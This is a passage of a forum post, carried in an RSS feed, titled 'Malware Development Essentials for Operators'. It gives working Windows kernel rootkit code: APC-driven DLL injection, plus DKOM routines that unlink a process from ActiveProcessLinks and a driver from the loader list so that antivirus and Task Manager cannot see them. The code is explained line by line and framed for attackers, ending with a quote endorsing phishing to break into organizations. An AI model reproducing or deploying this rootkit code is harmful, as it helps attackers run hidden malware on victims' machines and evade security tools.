<p>The initiation of DLL injection takes place within the <code>APCInjectorRoutine</code> function, The <code>APCInjectorRoutine</code> function serves as the orchestrator for our DLL injection process. It commences by initializing a <code>SIRIFEF_INJECTION_DATA</code> structure, <code>Sf</code>, and scheduling a worker thread (<code>SirifefWorkerRoutine</code>) to perform the injection.</p>
<pre><code class="lang-c">VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *SystemArgument1, PVOID *SystemArgument2, PVOID* Context)
{
    SIRIFEF_INJECTION_DATA Sf;

    RtlSecureZeroMemory(&amp;Sf, sizeof(SIRIFEF_INJECTION_DATA));
    ExFreePool(Apc);

    // Initialize the SIRIFEF_INJECTION_DATA structure with the necessary information
    Sf.Ethread = KeGetCurrentThread();
    Sf.Process = IoGetCurrentProcess();
    Sf.ProcessId = PsGetCurrentProcessId();

    // Initialize an event to synchronize the DLL injection
    KeInitializeEvent(&amp;Sf.Event, NotificationEvent, FALSE);

    // Initialize a work item to execute the SirifefWorkerRoutine
    ExInitializeWorkItem(&amp;Sf.WorkItem, (PWORKER_THREAD_ROUTINE)SirifefWorkerRoutine, &amp;Sf);

    // Queue the work item to be executed on the DelayedWorkQueue
    ExQueueWorkItem(&amp;Sf.WorkItem, DelayedWorkQueue);

    // Wait for the DLL injection to complete
    KeWaitForSingleObject(&amp;Sf.Event, Executive, KernelMode, TRUE, 0);

    return;
}

</code></pre>
<p>These routines work together to schedule and execute the DLL injection into the target process after the <code>kernel32.dll</code> module is loaded. This injection is performed in a controlled and synchronized manner, ensuring that the target process is injected with the specified.</p>
<h3><a name="hide-process-31" class="anchor" href="https://0x00sec.org#hide-process-31"></a>Hide Process</h3>
<p>A interesting technique we can use in our rootkit is to hide or unlink a target process, which will be hidden from AVs,  We won’t be able to see this in the Windows Task Manager.</p>
<p>To hide our process we need to understand a few Windows internal concepts, such as the <code>EPROCESS</code> data structure in the Windows kernel. <code>EPROCESS</code> is an opaque data structure in the Windows kernel that contains important information about processes running on the system. The offsets of this large structure change from build to build or version to version.</p>
<p>What we’re interested in is, <code>ActiveProcessLinks</code>, which is a pointer to a structure called <code>LIST_ENTRY</code>. We can’t just access this data structure normally like <code>EPROCESS.ActiveProcessLinks</code>, we have to use <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psgetcurrentprocessid" rel="noopener nofollow ugc">PsGetCurrentProcess</a> to get the current <code>EPROCESS</code> and then add an offset that is version dependent. This is the downside to the <code>EPROCESS</code> structure. It can make it very hard to have a compatible Windows Kernel rootkit.</p>
<pre><code class="lang-auto">kd&gt; dt nt!_EPROCESS
&lt;..redacted...&gt;
    +0x000 Pcb              : _KPROCESS
    +0x3e8 ProcessLock      : _EX_PUSH_LOCK
    +0x2f0 UniqueProcessId  : Ptr64 Void
    +0x400 ActiveProcessLinks : _LIST_ENTRY
</code></pre>
<p>The <code>LIST_ENTRY</code> data structure is a doubly-linked list, where <code>FLINK</code> (forward link) and <code>BLINK</code> are references to the next and previous elements in the doubly-linked list.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/c/ccd2ee6f9d86b1a37e534d272e9834b669bb0616.png" data-download-href="/uploads/short-url/tdXjZgZaIqarhbexg3YcR2oWNM2.png?dl=1" title="img" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/c/ccd2ee6f9d86b1a37e534d272e9834b669bb0616.png" alt="img" data-base62-sha1="tdXjZgZaIqarhbexg3YcR2oWNM2" width="690" height="178" data-dominant-color="ECECEC"></a></div><p></p>
<p>Using the information above, we can hide our process from being shown by manipulating the kernel data structures. To hide our process we can do the following:</p>
<ul>
<li>Point the <code>ActiveProcessLinks.FLINK</code> of <code>EPROCESS 1</code> to <code>ActiveProcessLinks.FLINK</code> of <code>EPROCESS 3</code> .</li>
<li>Point <code>ActiveProcessLinks.BLINK</code> of <code>EPROCESS 3</code> to <code>ActiveProcessLinks.BLINK</code> OF <code>EPROCESS 1</code>.</li>
</ul>
<p>This manipulation unlinks the data structure of our target process, <code>EPROCESS 2</code>, from the doubly-linked list, rendering it invisible to system inspectors.</p>
<pre><code class="lang-c">// Function to hide a process by manipulating kernel data structures
NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS currentEProcess = PsGetCurrentProcess();
    LIST_ENTRY* currentList = &amp;currentEProcess-&gt;ActiveProcessLinks;
    
    // Get the offsets for UniqueProcessId and ActiveProcessLinks
    ULONG uniqueProcessIdOffset = FIELD_OFFSET(EPROCESS, UniqueProcessId);
    ULONG activeProcessLinksOffset = FIELD_OFFSET(EPROCESS, ActiveProcessLinks);
    
    ULONG currentPid;
    
    do {
        // Check if the current process ID is the one to hide
        RtlCopyMemory(&amp;currentPid, (PUCHAR)currentEProcess + uniqueProcessIdOffset, sizeof(currentPid));
        if (currentPid == pid) {
            // Remove the process from the list
            LIST_ENTRY* blink = currentList-&gt;Blink;
            LIST_ENTRY* flink = currentList-&gt;Flink;
            blink-&gt;Flink = flink;
            flink-&gt;Blink = blink;
            return STATUS_SUCCESS;
        }
        
        // Move to the next process
        currentList = currentList-&gt;Flink;
        currentEProcess = CONTAINING_RECORD(currentList, EPROCESS, ActiveProcessLinks);
    } while (currentList != &amp;currentEProcess-&gt;ActiveProcessLinks);
    
    return STATUS_NOT_FOUND;  // Process not found
}
</code></pre>
<p><code>HideProcess</code>, which hides a process using the DKOM technique. It takes the Process ID (PID) of the target process as an argument. Here’s how it works:</p>
<ol>
<li>It starts by obtaining the current <code>EPROCESS</code> structure for the executing driver using <code>PsGetCurrentProcess</code>.</li>
<li>The code then retrieves the offsets within the <code>EPROCESS</code> structure for <code>UniqueProcessId</code> and <code>ActiveProcessLinks</code>.</li>
<li>It iterates through the list of active processes, comparing the PID of each process with the target PID. When it finds a match, it unlinks the process from the <code>ActiveProcessLinks</code> list, effectively hiding it.</li>
<li>The function returns <code>STATUS_SUCCESS</code> if it successfully hides the process. If the target process is not found, it returns <code>STATUS_NOT_FOUND</code>.</li>
</ol>
<h3><a name="hiding-a-driver-32" class="anchor" href="https://0x00sec.org#hiding-a-driver-32"></a>Hiding a Driver</h3>
<p>In addition to hiding processes, we can also employ the DKOM technique to hide drivers from the system. This is particularly useful in scenarios where a rootkit needs to remain undetected</p>
<pre><code class="lang-c">// Function to hide a driver by manipulating data structures
NTSTATUS HideDriver(PDRIVER_OBJECT driverObject) {
    KIRQL irql;
    
    // Raise IRQL to DPC level
    irql = KeRaiseIrqlToDpcLevel();
    
    // Get the module entry from the DriverObject
    PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;
    
    // Unlink the module entry
    moduleEntry-&gt;InLoadOrderLinks.Blink-&gt;Flink = moduleEntry-&gt;InLoadOrderLinks.Flink;
    moduleEntry-&gt;InLoadOrderLinks.Flink-&gt;Blink = moduleEntry-&gt;InLoadOrderLinks.Blink;
    
    // Lower IRQL back to its original value
    KeLowerIrql(irql);
    
    return STATUS_SUCCESS;
}

</code></pre>
<p><code>HideDriver</code> function is designed to hide a driver by manipulating kernel data structures. Here’s a breakdown of how it works:</p>
<ol>
<li>It raises the IRQL (Interrupt Request Level) to DPC (Deferred Procedure Call) level using <code>KeRaiseIrqlToDpcLevel</code>. This is essential to ensure that the manipulation of kernel data structures is performed atomically and doesn’t interfere with ongoing system operations.</li>
<li>Next, it obtains the module entry by casting the <code>DriverSection</code> member of the provided <code>driverObject</code> to a <code>PLDR_DATA_TABLE_ENTRY</code>. This provides access to information about the driver module.</li>
<li>It unlinks the module entry from the kernel’s internal linked lists. By manipulating the <code>InLoadOrderLinks</code> member of the module entry, it effectively removes the driver from the list of loaded modules.</li>
<li>Finally, it lowers the IRQL back to its original value using <code>KeLowerIrql</code>, allowing normal system operation to resume.</li>
</ol>
<h1><a name="conclusion-33" class="anchor" href="https://0x00sec.org#conclusion-33"></a>Conclusion</h1>
<p>Thank you for reading, and I hope you’ve learned something from this. We’ve covered a lot of topics. I removed the shellcode development section to keep things simpler, which I may cover in a separate article. I’ve included great resources that helped create this article. Remember,</p>
<p>" Social engineering and phishing, combined with some operative knowledge about windows hacking, should be enough to get you inside the networks of most organization"</p>
<h2><a name="references-and-credits-34" class="anchor" href="https://0x00sec.org#references-and-credits-34"></a>References and Credits</h2>
<p><a href="https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/" rel="noopener nofollow ugc"> Anatomy of the Process Environment Block (PEB) (Windows Internals</a></p>
<p><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland" rel="noopener nofollow ugc">Manipulating Active processlinks</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection" rel="noopener nofollow ugc"> DLL Injection</a></p>
<p><a href="https://memn0ps.github.io/kernel-mode-rootkits/" rel="noopener nofollow ugc">Kernel Mode Rootkits</a></p>
<p><a href="https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions" rel="noopener nofollow ugc">Enumerating RWX Protected Memory Regions for Code Injection</a></p>
<p><a href="https://www.drmaster.com.tw/Bookinfo.asp?BookID=MP22111" rel="noopener nofollow ugc">Windows APT Warfare</a></p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/1</link>
        <pubDate>Wed, 08 Nov 2023 02:33:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-1</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
  </channel>
</rss>
